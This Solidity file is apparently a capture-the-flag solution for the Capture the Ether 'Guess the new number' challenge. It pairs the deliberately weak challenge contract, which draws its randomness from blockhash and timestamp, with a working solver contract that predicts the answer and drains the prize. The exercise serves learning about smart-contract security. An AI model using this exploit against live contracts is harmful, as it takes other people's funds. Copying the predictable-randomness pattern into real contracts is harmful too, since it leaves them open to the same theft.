// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

/// @title The original challenge contract
/// @notice Only has the functions we need
/// @dev Implemented using the latest solidity version, hence the differences from the original.
contract GuessTheNewNumberChallenge {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

/// @title The challenge solver
/// @author kyrers
/// @notice This will solve the challenge
/// @dev Implemented using the latest solidity version, hence the differences from the original. Plus, there may be better ways to solve the challenge
contract GuessTheNewNumberSolver {
    address owner;

    /// @notice Contract constructor. Sets the account used to deploy the contract as the owner.
    constructor() {
        owner = msg.sender;
    }

    /// @notice The guess function
    /// @dev There may be a better way to reach the answer and avoid using uint8(uint(keccak256(...)))
    /// @param guessTheNewNumberChallengeAddress The CTE challenge address
    function guess(address guessTheNewNumberChallengeAddress) payable external {
        //Verify that we received 1 ETH with the function call
        require(msg.value == 1 ether, "You did not send 1 ETH");

        //Compute the answer
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        //Call the function and send it 1 ETH along with the answer
        GuessTheNewNumberChallenge challengeContract = GuessTheNewNumberChallenge(guessTheNewNumberChallengeAddress);
        challengeContract.guess{value: msg.value}(answer);
    }

    /// @notice The withdraw function that allows you to recover your 2 ETH spent solving the challenge
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    /// @notice The fallback function, needed to receive the 2 ETH sent by the contract after guessing correctly.
    /// @dev We don't simply send the 2 ETH to our wallet from this function because fallback functions permit only limited operation due to gas limits.
    fallback() external payable { }
}